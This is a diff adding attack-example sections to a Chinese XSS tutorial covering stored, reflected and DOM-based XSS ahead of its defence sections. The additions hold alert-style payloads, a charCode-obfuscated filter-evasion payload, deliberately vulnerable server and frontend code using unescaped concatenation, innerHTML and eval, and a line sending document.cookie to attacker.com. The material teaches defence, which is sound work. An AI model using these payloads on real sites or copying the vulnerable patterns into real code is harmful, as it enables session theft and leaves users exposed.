@@ -25,6 +25,47 @@ Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入�
 
 它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。任何允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS。
 
+#### 攻击示例
+
+**场景**: 博客评论系统
+
+**攻击者提交的恶意评论**:
+```html
+" onload="alert('XSS攻击成功！你的Cookie是: ' + document.cookie)" "
+```
+
+**服务器端漏洞代码**:
+```javascript
+// 服务器端从数据库读取评论并直接拼接到HTML
+app.get('/post/:id', (req, res) => {
+  const comments = db.query('SELECT * FROM comments WHERE post_id = ?', [req.params.id]);
+
+  let html = '<div class="comments">';
+  comments.forEach(comment => {
+    // 危险！直接拼接用户输入到HTML，没有进行转义
+    html += `<div class="comment">
+               <img src="${comment.avatar}" alt="${comment.username}">
+               <p>${comment.content}</p>
+             </div>`;
+  });
+  html += '</div>';
+
+  res.send(html);
+});
+```
+
+**生成的HTML**:
+```html
+<div class="comment">
+  <img src="" onload="alert('XSS攻击成功！你的Cookie是: ' + document.cookie)" " alt="攻击者">
+  <p>这是一条正常的评论内容</p>
+</div>
+```
+
+**攻击效果**:
+- 当其他用户访问这个博客文章时，会立即弹出alert对话框，显示他们的Cookie信息
+- 攻击者可以修改脚本将Cookie发送到远程服务器: `fetch('http://attacker.com/steal?cookie=' + document.cookie)`
+
 #### 防御方式
 **1. CSP**: Content-Security-Policy
 
@@ -54,6 +95,51 @@ Cross-Site Scripting（跨站脚本攻击）简称 XSS，是一种代码注入�
 
 POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛刻（需要构造表单提交页面，并引导用户点击），所以非常少见。
 
+#### 攻击示例
+
+**场景**: 网站搜索功能
+
+**恶意URL**:
+```
+https://example.com/search?q=<script>alert('XSS')</script>
+https://example.com/search?q=<img src=x onerror=alert('XSS')>
+https://example.com/redirect?url=javascript:alert('XSS')
+```
+
+**服务器端漏洞代码**:
+```javascript
+// 搜索功能直接将用户输入拼接到返回页面
+app.get('/search', (req, res) => {
+  const query = req.query.q;  // 从URL获取搜索关键词
+
+  // 危险！没有对搜索关键词进行HTML转义
+  res.send(`
+    <h1>搜索结果</h1>
+    <p>你搜索的是: ${query}</p>
+    <p>没有找到相关结果</p>
+  `);
+});
+```
+
+**当用户访问恶意URL时生成的HTML**:
+```html
+<h1>搜索结果</h1>
+<p>你搜索的是: <script>alert('XSS')</script></p>
+<p>没有找到相关结果</p>
+```
+
+**攻击效果**:
+- 用户点击恶意链接后，会立即执行其中的JavaScript代码
+- 攻击者可以通过URL窃取用户的登录态、Cookie等信息
+- 攻击者通常会使用短链接服务或社会工程学手段诱导用户点击恶意链接
+
+**更隐蔽的攻击方式**:
+攻击者可能使用编码来绕过简单的过滤:
+```
+https://example.com/search?q=<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
+```
+这会将ASCII码转换为字符串并执行，达到同样的攻击效果但更难以检测。
+
 #### 防御方式
 1. Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端。
 2. 尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染
@@ -75,6 +161,67 @@ POST 的内容也可以触发反射型 XSS，只不过其触发条件比较苛�
 | 存储型 XSS | 后端数据库              | HTML            |
 | 反射型 XSS | URL                     | HTML            |
 | DOM 型 XSS | 后端数据库/前端存储/URL | 前端 JavaScript |
+
+#### 攻击示例
+
+**场景**: 单页应用(SPA)的页面渲染
+
+**恶意URL**:
+```
+https://example.com/#user=<script>alert('XSS')</script>
+https://example.com/#user=<img src=x onerror=alert('XSS')>
+```
+
+**前端漏洞代码**:
+```javascript
+// 从URL hash获取用户数据并直接渲染到页面
+function renderUserProfile() {
+  // 获取URL hash参数
+  const hash = window.location.hash.substring(1);
+  const params = new URLSearchParams(hash);
+  const userData = params.get('user');
+
+  // 危险！直接将用户输入写入innerHTML
+  const profileContainer = document.getElementById('profile');
+  profileContainer.innerHTML = `
+    <div class="profile">
+      <h2>用户资料</h2>
+      <p>用户名: ${userData}</p>
+    </div>
+  `;
+}
+
+// 页面加载时执行
+window.addEventListener('DOMContentLoaded', renderUserProfile);
+```
+
+**攻击效果**:
+- 当用户被诱导访问恶意URL时，`innerHTML`会解析并执行其中的脚本
+- 由于整个过程在浏览器端完成，服务器端可能完全不知情
+- 即使服务器端已经做了防护，前端代码的漏洞依然会导致XSS
+
+**另一个常见场景 - 使用eval()**:
+```javascript
+// 从localStorage读取数据并执行
+const userPrefs = localStorage.getItem('preferences');
+// 危险！执行了不可信的代码
+eval(userPrefs);
+
+// 攻击者可能提前注入恶意代码到localStorage
+localStorage.setItem('preferences', "alert('通过localStorage执行的XSS')");
+```
+
+**第三个场景 - document.write()**:
+```javascript
+// 根据URL参数动态生成页面内容
+const params = new URLSearchParams(window.location.search);
+const theme = params.get('theme');
+
+// 危险！document.write可以写入可执行的脚本
+document.write('<link rel="stylesheet" href="' + theme + '.css">');
+
+// 攻击URL: https://example.com?theme="><script>alert('XSS')</script><link href="
+```
 
 #### 防御方式
 1. 在使用 `.innerHTML`、`.outerHTML`、`document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 `.textContent`、`.setAttribute()` 等。
